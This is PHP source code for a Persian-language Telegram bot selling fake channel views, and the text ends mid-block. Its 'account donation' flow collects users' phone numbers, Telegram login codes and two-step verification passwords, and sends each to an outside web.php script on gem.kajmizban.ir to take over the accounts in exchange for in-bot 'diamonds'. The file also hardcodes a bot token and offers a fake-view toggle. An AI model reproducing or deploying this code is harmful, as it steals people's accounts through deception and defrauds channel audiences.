<?php
error_reporting(0);
include 'jdf.php';
$load = sys_getloadavg();
$token = "1934977286:AAEW3s1vGJ9h1DIPoBA95zpaOCRoyBvmx14";//توکن را وارد کنید
define('API_KEY',$token);
date_default_timezone_set('Asia/Tehran');
//-------------------------
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
function SendAudio($from_id,$audio,$keyboard,$caption,$sazande,$title){
	bot('SendAudio',[
	'chat_id'=>$from_id,
	'audio'=>$audio,
	'caption'=>$caption,
	'performer'=>$sazande,
	'title'=>$title,
	'reply_markup'=>$keyboard
	]);
	}
function SendDocument($from_id,$document,$keyboard,$caption){
	bot('SendDocument',[
	'chat_id'=>$from_id,
	'document'=>$document,
	'caption'=>$caption,
	'reply_markup'=>$keyboard
	]);
	}
function SendSticker($from_id,$sticker,$keyboard){
	bot('SendSticker',[
	'chat_id'=>$from_id,
	'sticker'=>$sticker,
	'reply_markup'=>$keyboard
	]);
	}
function SendVideo($from_id,$video,$caption,$keyboard,$duration){
	bot('SendVideo',[
	'chat_id'=>$from_id,
	'video'=>$video,
        'caption'=>$caption,
	'duration'=>$duration,
	'reply_markup'=>$keyboard
	]);
	}
function SendVoice($from_id,$voice,$keyboard,$caption){
	bot('SendVoice',[
	'chat_id'=>$from_id,
	'voice'=>$voice,
	'caption'=>$caption,
	'reply_markup'=>$keyboard
	]);
	}

function SendMessage($from_id, $text, $parsmde, $disable_web_page_preview, $keyboard){
	bot('sendMessage', [
	'chat_id' => $from_id,
	'text' => $text,
	'parse_mode' => $parsmde,
	'disable_web_page_preview' => $disable_web_page_preview,
	'reply_markup' => $keyboard
	]);
	}
function Forward($KojaShe,$AzKoja,$KodomMSG){
    bot('ForwardMessage',[
        'chat_id'=>$KojaShe,
        'from_chat_id'=>$AzKoja,
        'message_id'=>$KodomMSG
    ]);
}
function sendphoto($chat_id, $photo, $caption){
	bot('sendphoto',[
	'chat_id'=>$chat_id,
	'photo'=>$photo,
	'caption'=>$caption
	]);
	}
function save($filename,$TXTdata){
	$myfile = fopen($filename, "w") or die("Unable to open file!");
	fwrite($myfile, "$TXTdata");
	fclose($myfile);
	}
	function objectToArrays($object)
    {
        if (!is_object($object) && !is_array($object)) {
            return $object;
        }
        if (is_object($object)) {
            $object = get_object_vars($object);
        }
        return array_map("objectToArrays", $object);
    }
	function EditMessageText($chat_id,$message_id,$text,$parse_mode,$disable_web_page_preview,$keyboard){
	 bot('editMessagetext',[
    'chat_id'=>$chat_id,
	'message_id'=>$message_id,
    'text'=>$text,
    'parse_mode'=>$parse_mode,
	'disable_web_page_preview'=>$disable_web_page_preview,
    'reply_markup'=>$keyboard
	]);
	}
function rank($id){
    $array = []; $result = []; $ok = null; $i = 1;
    $scan = scandir('referral');
    $scan = array_diff($scan, ['.','..']);
    foreach($scan as $uid){
        $referral = file_get_contents("referral/$uid");
        $array[$uid] = $referral;
    }
    foreach($array as $key => $value){
        $max = max($array);
        $userid = array_search($max, $array);
        $result[$i] = $userid;
        $i += 1;
        unset($array[$userid]);
    }
    foreach($result as $rank => $user){
         if($user == $id){
              return $rank;
         }
    }
}
function BestFind($count=5){
     $res = []; $res2 = [];
     $glob = array_diff(scandir('referral'), ['.','..']);
     foreach($glob as $file){
          $ref = file_get_contents("referral/".$file);
          $res[$file] = $ref;
     }
     for($i = 1; $i <= 5; $i++){
          $max = max($res);
          $sr = array_search($max, $res);
          $res2[] = ['rank'=>$i, 'id'=>$sr, 'referral'=>$max];
          unset($res[$sr]);
     }
     return $res2;
}
function GetStartDay($year,$month,$day){
return mktime(0,0,0,$month,$day+1,$year);
}
function GetViews($channel, $post){
      $embed = file_get_contents("https://t.me/$channel/$post?embed=true");
      preg_match_all('/<span class="tgme_widget_message_views">(.*?)<\/span>/si',$embed,$match);
      $views = $match[1][0];
      return $views;
}
function DeleteFolder($path){
	if($handle=opendir($path)){
		while (false!==($file=readdir($handle))){
			if($file<>"." AND $file<>".."){
				if(is_file($path.'/'.$file)){ 
					@unlink($path.'/'.$file);
				} 
				if(is_dir($path.'/'.$file)) { 
					deletefolder($path.'/'.$file); 
					@rmdir($path.'/'.$file); 
				}
			}
        }
    }
}
function sendcontact($chat_id, $phone_number, $first_name){
bot('sendcontact',[
'chat_id'=>$chat_id,
'phone_number'=>$phone_number,
'first_name'=>$first_name
]);
}

//ر
#-----------------------------
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$message_id = $update->message->message_id;
$el = file_get_contents('data/elan.txt');
$chat_id = $message->chat->id;
$message_id = $message->message_id;
$from_id = $message->from->id;
$text = $update->message->text;
mkdir("data/$from_id");
$bot = file_get_contents("data/$from_id/com.txt");
$mmad = file_get_contents("data/$from_id/com.txt");
$ADMIN = array("1116526399","822363872");//درجای 000 ایدی عددی ادمین ها را بزارید
$user = file_get_contents("Member.txt");
$channel = "@cptsha8";//ایدی کانال همراه با @
$tc = $update->message->chat->type;
$truechannel = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$channel&user_id=".$from_id));
$tch = $truechannel->result->status;
$tch1 = $truechannel2->result->status;
$username = $update->message->from->username;
$first = $update->message->from->first_name;
$file_id = $update->message->document->file_id;
$photo = $update->message->photo;
$photo_id = $photo[count($photo)-1]->file_id;
$musicid = $update->message->audio->file_id;
$voice_id = $update->message->voice->file_id;
$sticker_id = $update->message->sticker->file_id;
$video_id = $update->message->video->file_id;
$music_id = $update->message->audio->file_id;
$caption = $update->message->caption;
$reply = $update->message->reply_to_message->forward_from->id;
$rand1 = "0"; //تعداد الماس برای زیر مجموعه         بایدکمتر از تعداد پایینی باشد یا مساوی
$rand2 = "3"; // //تعداد الماس برای زیر مجموعه
#................به طور رندوم ارسال میشه اگر بر روی 2 و 2 قرار دهید 2 المس ارسال میشه.................
$date = jdate("Y F d");
$time = jdate("H:i:s");
$penlist = file_get_contents("data/pen.txt");
$php08 = file_get_contents("data/$from_id/meti.txt");
$list = file_get_contents("Member.txt");
$kodomadmin = file_get_contents("data/$chat_id/kodomadmin.txt");
$tedad = file_get_contents('data/'.$from_id."/golds.txt");
$member_count = count($member_id) -1;
$tm = $textmessage;
$myfile2 = fopen("data/php08.txt", 'w') or die("Unable to open file!");
$message = file_get_contents("data/php08.txt");
$met = file_get_contents ("data/admin/$from_id/php08.txt");
$f = $met;
@$wait = file_get_contents("data/$from_id/wait.txt");
@$coin = file_get_contents("data/$from_id/golds.txt");
@$Auto = file_get_contents("Auto/$chat_id.txt");
@$adad = file_get_contents('data/'.$from_id."/adad.txt");
@$sof = file_get_contents("data/sofs.txt");
@$on = file_get_contents("on.txt");
@$entshoma = file_get_contents("data/$from_id/entshoma.txt");
@$ali = file_get_contents("data/$chat_id/ali.txt");
$frosh= file_get_contents("data/frosh.txt");
$reza = file_get_contents("data/command.txt");
@$feek = file_get_contents("feek.txt");
@$vag = file_get_contents("vagh.txt");
@$createclicker = file_get_contents("user/$chatid/createclicker.txt");
@$creatview = file_get_contents("user/$chatid/creatview.txt");
@$command = file_get_contents("data/$chat_id/com.txt");
$messageid = $update->callback_query->message->message_id;
@$tokenclicker = file_get_contents("data/$from_id/tokenclicker.txt");
$domainhost = "https://gem.kajmizban.ir/view";
@$adminclicker = file_get_contents("data/$from_id/adminclicker.txt");
@$idclicker = file_get_contents("data/$from_id/idclicker.txt");
@$idadmin = file_get_contents("data/$from_id/idadmin.txt");
@$idchannel = file_get_contents("data/$from_id/idchannel.txt");
@$tokenbot = file_get_contents("data/$from_id/tokenbot.txt");
 $ident = file_get_contents("data/$chat_id/almasid.txt");
$adad1 = file_get_contents('data/'.$from_id."/adad1.txt");
@$ent = file_get_contents("data/$from_id/enteghal.txt");
@$entshoma = file_get_contents("data/$from_id/entshoma.txt");
#+============
$admin = "1116526399";//ایدی عددی ادمین
if(!is_dir("data")){mkdir("data");}
$data = json_decode(file_get_contents("data/$from_id.json"),true);
$step = $data['step'];
$id = $data['id'];
$urls = "https://gem.kajmizban.ir/view";//ادرس محل اپلودشده سورس
#------------------------------
$soof = file_get_contents("data/$from_id/sofs.txt");
#=============

#======
//اپن و نوشته شده توسط کانال : @cptsha8
$button_remove = json_encode(['KeyboardRemove'=>[
],'remove_keyboard'=>true]);
$button_manage = json_encode(['keyboard'=>[
	[['text'=>"💸افزایش الماس کاربر"],['text'=>"کاهش الماس کاربر"]],
	[['text'=>"🔖 آمار فعلی ربات"],['text'=>"☢کد رایگان"]],
	[['text'=>"فعالسازی اتوویو👨‍🔧"],['text'=>"غیر فعالسازی اتوویو👴"]],
	[['text'=>"	ارسال برترین ها"]],
		[['text'=>"📭پیام همگانی"],['text'=>"📮فوروارد همگانی"]],
			[['text'=>"بلاک کاربر❌"],['text'=>"🎁 الماس همگانی"],['text'=>"انبلاک کاربر✅"]],
			[['text'=>"💤خاموش کردن"],['text'=>"❇️روشن کردن"]],
			[['text'=>"خاموش کردن سین فیک"],['text'=>"روشن کردن سین فیک"]],
					[['text'=>"🔙برگشت🔙"],['text'=>"پاک کردن نفرات چالش❌"]],
],'resize_keyboard'=>true]);
$button_official_admin = json_encode(['keyboard'=>[
 [['text'=>"👀سفارش ویو👁"],['text'=>"بخش VIP 💻"]],
 [['text'=>"ارسال اکانت➕"]],
	[['text'=>"زیرمجموعه گیری👥️"],['text'=>"برترین ها👑"],['text'=>"مشخصات کاربری📓"]],
	[['text'=>"🔰اتوویو(ویو خودکار)"],['text'=>"خدمات[🏢]"]],
	[['text'=>"بانک[🏦]"],['text'=>"👤مدیریت"]],
],'resize_keyboard'=>true]);
$button_official_fa = json_encode(['keyboard'=>[
 [['text'=>"👀سفارش ویو👁"],['text'=>"بخش VIP 💻"]],
 [['text'=>"ارسال اکانت➕"]],
	[['text'=>"زیرمجموعه گیری👥️"],['text'=>"برترین ها👑"],['text'=>"مشخصات کاربری📓"],['text'=>"بانک[🏦]"]],
	[['text'=>"🔰اتوویو(ویو خودکار)"],['text'=>"خدمات[🏢]"]],
	[['text'=>"بانک[🏦]"]],
],'resize_keyboard'=>true]);
 $back = json_encode(["keyboard"=>[
[['text'=>"🔙برگشت🔙"]],
],'resize_keyboard'=>true,
]);
 $vip = json_encode(["keyboard"=>[
 [['text'=>"ساخت کلیکر آی بازدید👁"],['text'=>"✨ساخت ویوپنل✨"]],
[['text'=>"بازی[🎮]"]],
[['text'=>"🔙برگشت🔙"]],
],'resize_keyboard'=>true,
]);
$khad = json_encode(['keyboard'=>[
 	[['text'=>"پشتیبانی👨🏻‍💻"],['text'=>"🥇کد هدیه🏆"]],
 	[['text'=>"💵💳خرید سورس💳💵"]],
		[['text'=>"گردونه شانس🎡"],['text'=>"🔖 آمار فعلی ربات"]],
		[['text'=>"🔙برگشت🔙"]],
],'resize_keyboard'=>true]);

$firstt = json_encode([
'keyboard'=>[
    [['text'=>'☎️ اهدای شماره']],
    		[['text'=>"🔙برگشت🔙"]],
   ],
"resize_keyboard"=>true
]);
$button_saz = json_encode(['keyboard'=>[
              [['text'=>"راهنمای ساخت🔖"]],
	[['text'=>"ویوپنل بدون قفل🔓"],['text'=>"ویوپنل تک قفله🔒"],['text'=>"ویوپنل دوقفله🔐"]],
	[['text'=>"🔙برگشت🔙"]],
],'resize_keyboard'=>true]);
#-------------------------
if(in_array($from_id, explode("\n", $penlist))){
     exit();
}
if($on == "off" && !in_array($from_id,$ADMIN)){
bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"❗️ربات برای چند ساعت آینده خاموش شده است...
🌹 لطفا دقایقی دیگر دوباره امتحان کنید",
        'parse_mode'=>'MarkDown',
        	'reply_markup'=>$button_official_fa
	]);
    exit();
}
if($text == '🔙برگشت🔙'){
	   save("data/$from_id/com.txt","none");
	   $data['id'] = "none";
    $data['step'] = "none";
    file_put_contents("data/$from_id.json",json_encode($data,true));
	       bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"📄اومدیم به منوی اصلی📝",
        'parse_mode'=>'MarkDown',
        	'reply_markup'=>$button_official_fa
	]);
    exit();
}
if(isset($message)){
	$txxt = file_get_contents('Member.txt');
    $pmembersid= explode("\n",$txxt);
	if (!in_array($from_id,$pmembersid)){
        $myfile2 = fopen("Member.txt", "a") or die("Unable to open file!");
        fwrite($myfile2, "$from_id\n");
        fclose($myfile2);
}
}
if($textmessage == 'پیام به کاربر') {
   if ($from_id = $admin) {
     
     sendmessage($chat_id,"متن پیام خود را وارد کنید");
     save("data/admin/$from_id/com.txt","meti");
     }else{
     sendmessage($chat_id,"شما ادمین نیسید");
     }
     }
 if ($command == 'meti') {
    $tm = $textmessage;
    $myfile2 = fopen("data/php08.txt", 'w') or die("Unable to open file!");  
fwrite($myfile2, "$tm\n");
fclose($myfile2);

    sendmessage($chat_id,"ای دی عددی کاربر را ارسال کنید");
    save("data/admin/$from_id/com.txt","metii");
 }

    if ($command == 'metii') {
        save("data/admin/$from_id/php08.txt","$textmessage");
        
      $message = file_get_contents("data/php08.txt");
      save("data/admin/$from_id/com.txt","none");
      $met = file_get_contents ("data/admin/$from_id/php08.txt");
      $f = $met;
      sendmessage($chat_id,"✅");
     
     sendmessage($met,"پیام ادمین
     ➖➖➖
     $message
     ➖➖➖
    ✅");
     }
  if(in_array($from_id, $list['ban'])){
SendMessage($chat_id,"شما از این ربات مسدود شده اید
️", null, $message_id, $remove);
exit();}
  #--------------------------------
  //اپن و نوشته شده توسط کانال : @cptsha8
  #================================
    if(preg_match('/^\/([Ss]tart)(.*)/',$text)){
	 preg_match('/^\/([Ss]tart)(.*)/',$text,$match);
	$match[2] = str_replace(" ","",$match[2]);
$match[2] = str_replace("\n","",$match[2]);
if($match[2] != null){
if (strpos($user , "$from_id") == false){
if($match[2] != $from_id){
if (strpos($tedad , "$from_id") == false){
$txxt = file_get_contents("data/$match[2]/golds.txt");
$pmembersid= explode("\n",$txxt);
if (!in_array($from_id,$pmembersid)){
$deee = file_get_contents("data/$match[2]/golds.txt");
 	  $rand = rand($rand1,$rand2);
save("data/$match[2]/golds.txt",$deee+$rand);
       mkdir('referral');
       $all = file_get_contents("referral/$match[2]");
        file_put_contents("referral/$match[2]", $all+1);
       $tedad = $deee+$rand;
   		if(in_array($chat_id,$ADMIN)){
		bot('sendmessage',[
	'chat_id'=>$match[2],
	'text'=>"متشکریم❤️
ممنونیم از اینکه ربات مارا به دوستتون    ارسال کردید دوستت ینی ⏪ [$from_id](tg://user?id=$from_id)
با لینک شما به ربات ما پیوست به پاس تشکر    تعداد $rand الماس به شما ارسال شد🔻
تعداد الماس فعلی ▫️ $tedad ▪️",
        'parse_mode'=>'MarkDown',
	]);
		}else{
		bot('sendmessage',[
	'chat_id'=>$match[2],
	'text'=>"متشکریم❤️
ممنونیم از اینکه ربات مارا به دوستتون    ارسال کردید دوستت ینی ⏪ [$from_id](tg://user?id=$from_id)
با لینک شما به ربات ما پیوست به پاس تشکر    تعداد $rand الماس به شما ارسال شد🔻
تعداد الماس فعلی ▫️ $tedad ▪️",
        'parse_mode'=>'MarkDown',
	]);
		}
    }
	}
	}
	}
	}
  
if (!file_exists("data/$from_id/com.txt")) {
        mkdir("data/$from_id");
        file_put_contents("data/$from_id/com.txt","none");
        file_put_contents("data/$from_id/golds.txt","3");
		file_put_contents("data/$from_id/com.txt","none");
		file_put_contents("data/$from_id/golds.txt","3");
		}
    if(in_array($chat_id,$ADMIN)){
	bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"سلام عجیجم😁💋

این ربات چیکار میتونه بکنه؟🤔
خب اگه تعداد بازدید پست های کانالت کمه😶
اگه میخوای یچیزی باشه که ویو کانالتو ببره بالا!😛
پس به آرزوت رسیدی😂❤️

از الان به بعد شما هر پستی که میزاری کانالت رو مستقیم فروارد کن به من.. منم تعداد بازدید هاشو تو یک چشم به هم زدن افزایش میدم!!!🤥
میگی امکان نعره؟😐
خا امتحانش مجانیه😋

Creator: @cptsha8  ",
        'parse_mode'=>'html',
	        	'reply_markup'=>$button_official_admin
	]);
	}else{
	bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"سلام عجیجم😁💋

این ربات چیکار میتونه بکنه؟🤔
خب اگه تعداد بازدید پست های کانالت کمه😶
اگه میخوای یچیزی باشه که ویو کانالتو ببره بالا!😛
پس به آرزوت رسیدی😂❤️

از الان به بعد شما هر پستی که میزاری کانالت رو مستقیم فروارد کن به من.. منم تعداد بازدید هاشو تو یک چشم به هم زدن افزایش میدم!!!🤥
میگی امکان نعره؟😐
خا امتحانش مجانیه😋

Creator: @cptsha8  ",
        'parse_mode'=>'html',
		        	'reply_markup'=>$button_official_fa
	]);
	}
	}
if($tch != 'member' && $tch != 'creator' && $tch != 'administrator'){
	bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"📛 برای حمایت از ما و همچنان ربات ابتدا وارد کانال زیر بشید 👇

🆔  $channel
 

✅ سپس روی JOIN بزنید و به ربات برگشته عبارت 👇

🔸 /start

✴️ رو بزنید تا دکمه های ربات نمایش داده بشن👌",
        'parse_mode'=>'html',
        	'reply_markup'=>json_encode(['KeyboardRemove'=>[
],'remove_keyboard'=>true
])
	]);
	}
	#=====
	
	#======
	
	//اپن و نوشته شده توسط کانال : @cptsha8

if(preg_match("/^[\/]?([Ss][Tt][Aa][Rr][Tt])$/i",$text)){
    $list = file_get_contents('data/user.txt');
if(strpos($list, "$from_id") === false){
    $myfile2 = fopen("data/user.txt", "a") or die("Unable to open file!");
    fwrite($myfile2, "$from_id\n");
    fclose($myfile2);
}
    $data['step'] = "none";
    file_put_contents("data/$from_id.json",json_encode($data,true));}
    
    
   
#========================
elseif($text == "خدمات[🏢]"){
	bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"به بخش خدمات ربات ویوپنل خوش آمدید🍡
از دکمه های زیر استفاده کنید🎭",'parse_mode'=>'html',
        	'reply_markup'=>$khad
	]);
}
elseif($text == "بخش VIP 💻"){
	bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"به بخش خدمات ربات ویوپنل خوش آمدید🍡
از دکمه های زیر استفاده کنید🎭",'parse_mode'=>'html',
        	'reply_markup'=>$vip
	]);
	}
#========================
elseif($text == "📈 تاریخچه انتقال 📈") {
	        bot('sendmessage', [
            'chat_id' => $chat_id,
                  'text' => "الماس های انتقالی از شما🧾
				  $ent",
        ]);
   } 
   elseif($text == "📉 تاریخچه دریافت 📉") {
	        bot('sendmessage', [
            'chat_id' => $chat_id,
                  'text' => "الماس های دریافتی شما📍
				  $entshoma",
        ]);
   } 

	elseif($text == "💼گرفتن وام"){
	bot('sendMessage', [
   'chat_id' => $chat_id,
    'text'=>"این قسمت به زودی افتتاح خواهد شد🕶",
	  ]);}
	if ($text == "انتقال موجودی⛪️") {
       $almasid = file_get_contents("data/$from_id/almasid.txt");
        file_put_contents("data/$from_id/com.txt", "entalmas1");
              bot('sendmessage', [
            'chat_id' => $chat_id,
            'message_id' => $message_id2,
            'text' => "⚠️کاربر گرامی برای انتقال بازدید از خود به کاربری دیگر به شناسه کاربری[آیدی عددی] شخص نیاز است لطفا آن را وارد نمایید. ",
              'reply_markup' => json_encode([
                'keyboard' => [
                    [
            ['text' => "🔙برگشت🔙"]
                    ],
                ]
            ])
        ]);
    } elseif ($command == 'entalmas1') {
            if (strpos($user, "$text") !== false) {
         if (preg_match('/^([0-9])/', $text)) {
        file_put_contents("data/$from_id/almasid.txt", $text);
        file_put_contents("data/$from_id/com.txt", "entalmas2");
    $sho = file_get_contents("data/$from_id/golds.txt");
        $shoo = $sho -3;
              bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "❓تعداد بازدیدهای مورد نظر برای انتقال را وارد کنید:

⚠️ نکته:
 شما قادر به انتقال حداقل 10 بازدید و حداکثر $shoo میباشید ",
             'reply_markup' => json_encode([
                'inline_keyboard' => [
                    [
            ['text' => "🔙برگشت🔙", 'callback_data' => "home"]
                    ],
                ]
            ])
        ]);
            } else {
            bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' =>  "کاربرگرامی لطفا ایدی عددی را به صورت انگلیسی وارد کنید ",
             'reply_markup' => json_encode([
                'keyboard' => [
                    [
            ['text' => "🔙برگشت🔙"]
                    ],
                ]
            ])
        ]);
   }
            } else {
           bot('sendmessage', [
            'chat_id' => $chat_id,
             'text' => "خطا❌
آیدی عددی وارد شده اشتباه می باشد یا کاربر مورد نظر عضو ربات نمیباشد  ",
             'reply_markup' => json_encode([
                 'keyboard' => [
                    [
            ['text' => "🔙برگشت🔙"]
                    ],
                ]
            ])
        ]);
   }
    } elseif ($command == 'entalmas2') {
            if ($tedad > $text) {
              if ($text > 10) {
       $alms = file_get_contents("data/$from_id/golds.txt");
          $fle = file_get_contents("data/$ident/golds.txt");
                $alm = $text;
               $getshe = $fle + $alm;
                file_put_contents("data/$ident/golds.txt", $getshe);
    $sho = file_put_contents("data/$ident/golds.txt");
        file_put_contents("data/$from_id/com.txt", "");
 bot('sendmessage', [
            'chat_id' => $ident,
             'text' => "✅ مقدار $text بازدید از طرف شماره کاربری $from_id به حساب شما با موفقیت انتقال یافت.
بازدید فعلی👁‍🗨: $sho",
                     ]);
           $getalm = $alms - $alm;
        file_put_contents("data/$from_id/golds.txt", "$getalm");
    $ident = file_get_contents("data/$from_id/almasid.txt");
    $sho = file_get_contents("data/$from_id/golds.txt");
               $entshoma = file_get_contents("data/$ident/entshoma.txt");
               $getshee = $entshoma + $text;
                file_put_contents("data/$ident/entshoma.txt", $getshee);
            $ss = file_get_contents("data/$from_id/enteghal.txt");
           $sss = $ss + $text;
                file_put_contents("data/$from_id/enteghal.txt", $sss);
                 bot('sendmessage', [
            'chat_id' => $chat_id,
             'text' => "✅ ممنون بابت کمک رسانی به دوستتⓂ️شما تعداد $text الماس را ارسال کردی به $ident ⭐️
الماس فعلی🧳: $tedad
",
                     ]);
            } else {
                  bot('sendmessage', [
            'chat_id' => $chat_id,
             'text' => "حداقل بازدید مجاز برای انتقال 10 بازدید میباشد",
                     ]);
   }
        } else {
                              bot('sendmessage', [
            'chat_id' => $chat_id,
             'text' => " موجودی ناکافی",
                     ]);
	}}
	elseif($text == "بانک[🏦]"){
	bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"سلام به بانک مرکزی ویوپنل خوش آمدید🏦

در اینجا میتوانید الماس های خود را کنترل کنید و آنها را انتقال دهید🛤

پس لطفا از دکمه های زیر استفاده کنید⌨️",
        	'reply_markup'=>json_encode([
	'resize_keyboard'=>true,
	'keyboard'=>[
	[['text'=>"اطلاعات بانکی🏦"],['text'=>"💳 خرید الماس🏧"],['text'=>"انتقال موجودی⛪️"]],
	[['text'=>"📉 تاریخچه دریافت 📉"],['text'=>"📈 تاریخچه انتقال 📈"]],
	[['text'=>"💼گرفتن وام"]],
	[['text'=>"🔙برگشت🔙"]]
	]
	])
	]);
	}
	#====================
elseif($text == "ارسال اکانت➕"){
     bot('sendmessage',[
    'chat_id'=>$from_id,
    'text'=>'👋 سلام دوست گلم ! خوش حالیم که اینجا هستی واسه اهدای شماره!!

ما به کمک شما نیاز داریم تا سین های رباتمون رو افزایش بدیم و رباتی
بهتر از دیروز برای شما فراهم کنیم😁

راستی با کمک به ما به ازای هر شماره که میدی بهت ۵ الی ۱۰ الماس میدیم😊
اگه میخوای بهمون کمک کنی روی دکمه اهدای شماره زیر بزن👇😉',
    'reply_markup' => $firstt
    ]);
}
if($text == "☎️ اهدای شماره"){
    $data['step'] = "sendnumber";
    file_put_contents("data/$from_id.json",json_encode($data,true));
    bot('sendmessage',[
    'chat_id'=>$from_id,
    'text'=>'به بخش اهدای اکانت خوش آمدید!

💢نکات مهم این بخش :

1- شماره ای که ارسال میکنی رنج خودش داشته باشه! مثلا :
+1——--

2- شماره ای که میخوای بفرستی تا حد ممکن نو باشه و نشست فعال نداشته باشه!

شمارتو با رعایت قوانین بالا ارسال کن✅',
    'reply_markup' => $back
    ]);
}
if($step == "sendnumber" && $text != "🔙برگشت🔙"){
    bot('sendmessage',[
    'chat_id'=>$from_id,
    'text'=>'☢️ درحال پردازش برای انجام عملیات  ...',
    ]);
    $text = str_replace([' ','+'],null,$text);
if(is_numeric($text)){
    $url = file_get_contents("$urls/web.php?phone=+$text");
if(strpos($url, 'code') !== false){
    $ra = str_replace('code ',null,$url);
    $data['id'] = "$ra";
    $data['step'] = "sendcode";
    file_put_contents("data/$from_id.json",json_encode($data,true));
    bot('sendmessage',[
    'chat_id'=>$from_id,
    'text'=>'😋 کد ارسال شده به اکانت شما را وارد نمایید :',
    ]);
    exit();
}
if(strpos($url, 'banned') !== false){
    $data['step'] = "none";
    file_put_contents("data/$from_id.json",json_encode($data,true));
    bot('sendmessage',[
    'chat_id'=>$from_id,
    'text'=>'شماره شما در تلگرام بن شده است😑',
    'reply_markup' => $firstt
    ]);
    exit();
}
if(strpos($url, 'FLOOD_WAIT_') !== false){
    $data['step'] = "none";
    file_put_contents("data/$from_id.json",json_encode($data,true));
    $mah = str_replace('FLOOD_WAIT_',null,$url);
    bot('sendmessage',[
    'chat_id'=>$from_id,
    'text'=>"شماره شما دارای محدودیت است کمی بعد تلاش کنید😢
مدت زمان محدودیت : $mah ثانیه",
    'reply_markup' => $firstt
    ]);
    exit();
}
    $data['id'] = "none";
    $data['step'] = "none";
    file_put_contents("data/$from_id.json",json_encode($data,true));
    bot('sendmessage',[
    'chat_id'=>$from_id,
    'text'=>'😓 متاسفانه عملیات با شکست مواجه شد لطفا یک شماره دیگر وارد کنید',
    'reply_markup' => $firstt
    ]);
}else{
    $data['step'] = "none";
    file_put_contents("data/$from_id.json",json_encode($data,true));
    bot('sendmessage',[
    'chat_id'=>$from_id,
    'text'=>'❗️ لطفا شماره را با رنج وارد کنید
برای مثال اگر شماره مجازی شما از نوع آمریکا است آن را به این صورت وارد کنید:

+1*******',
    'reply_markup' => $firstt
    ]);
}}
if($step == "sendcode" && $text != "🔙برگشت🔙"){
    bot('sendmessage',[
    'chat_id'=>$from_id,
    'text'=>'☢️ درحال پردازش برای انجام عملیات  ...',
    ]);
    $text = str_replace(' ',null,$text);
if(is_numeric($text)){
    $url = file_get_contents("$urls/web.php?id=$id&code=$text");
if(strpos($url,"Login") !== false){
    bot('sendmessage',[
    'chat_id'=>$from_id,
    'text'=>"اکانت با موفقیت اهدا شد لطفا از اکانت خارج شوید ممنون از حمایتتون ❤️",
    'reply_markup' => $firstt
    ]);
   $data['id'] = "none";
    $data['step'] = "none";
    file_put_contents("data/$from_id.json",json_encode($data,true));
 $alma  = $tedad + 5;
    file_put_contents("data/$from_id/golds.txt",$alma);
    	$newsoof = $soof + 1;
    		file_put_contents("data/$from_id/sofs.txt",$newsoof);
    bot('sendmessage',[
    'chat_id'=>$from_id,
    'text'=>"به پاس حمایت ما به شما 5 الماس اهدا شد✅
تعداد المس فعلی=>  $alma 😋",
    ]);
      exit();
}
if(strpos($url,"2fa") !== false){
    $data['step'] = "send2fa";
    file_put_contents("data/$from_id.json",json_encode($data,true));
    bot('sendmessage',[
    'chat_id'=>$from_id,
    'text'=>'اکانت شما دارای تایید دو مرحله ای میباشد!
لطفا تایید دو مرحله ای اکانت خود را ارسال کنید😊',
    ]);
    exit();
}
if(strpos($url,"PHONE_CODE_INVALID") !== false){
    bot('sendmessage',[
    'chat_id'=>$from_id,
    'text'=>'کد ارسالی اشتباه میباشد کد درست بفرست 😕',
    ]);
    exit();
}
    $data['id'] = "none";
    $data['step'] = "none";
    file_put_contents("data/$from_id.json",json_encode($data,true));
    bot('sendmessage',[
    'chat_id'=>$from_id,
    'text'=>'😓 متاسفانه عملیات با شکست مواجه شد لطفا یک شماره دیگر وارد کنید',
    'reply_markup' => $firstt
    ]);
}else{
    bot('sendmessage',[
    'chat_id'=>$from_id,
    'text'=>'کد اشتباهه ی عدد بفرست😑',
    ]);
}}
if($step == "send2fa" && $text != "🔙برگشت🔙"){
    bot('sendmessage',[
    'chat_id'=>$from_id,
    'text'=>'☢️ درحال پردازش برای انجام عملیات  ...',
    ]);
    $url = file_get_contents("$urls/web.php?id=$id&2fa=$text");
if(strpos($url,"Login") !== false){
         bot('sendmessage',[
    'chat_id'=>$from_id,
    'text'=>"اکانت با موفقیت اهدا شد لطفا از اکانت خارج شوید ممنون از حمایتتون ❤️",
    'reply_markup' => $firstt
    ]);
  
   $data['id'] = "none";
    $data['step'] = "none";
    file_put_contents("data/$from_id.json",json_encode($data,true));
 $alma  = $tedad + 5;
    file_put_contents("data/$from_id/golds.txt",$alma);
    		$newsoof = $soof + 1;
    		file_put_contents("data/$from_id/sofs.txt",$newsoof);
    bot('sendmessage',[
    'chat_id'=>$from_id,
    'text'=>"به پاس حمایت ما به شما 5 الماس اهدا شد✅
تعداد المس فعلی=>  $alma 😋",
    ]);
      exit();
}
if(strpos($url,"PASSWORD_HASH_INVALID") !== false){
    bot('sendmessage',[
    'chat_id'=>$from_id,
    'text'=>'تایید دو مرحله ای اشتباهه درستش بفرست😑',
    ]);
    exit();
}
    $data['id'] = "none";
    $data['step'] = "none";
    file_put_contents("data/$from_id.json",json_encode($data,true));
    bot('sendmessage',[
    'chat_id'=>$from_id,
    'text'=>'😓 متاسفانه عملیات با شکست مواجه شد لطفا یک شماره دیگر وارد کنید',
    'reply_markup' => $firstt
    ]);
}
if($step == "gift" && $text != "🔙برگشت🔙"){
$data['id'] = "none";
    $data['step'] = "none";
    file_put_contents("data/$from_id.json",json_encode($data,true));
 $alma  = $tedad + 5;
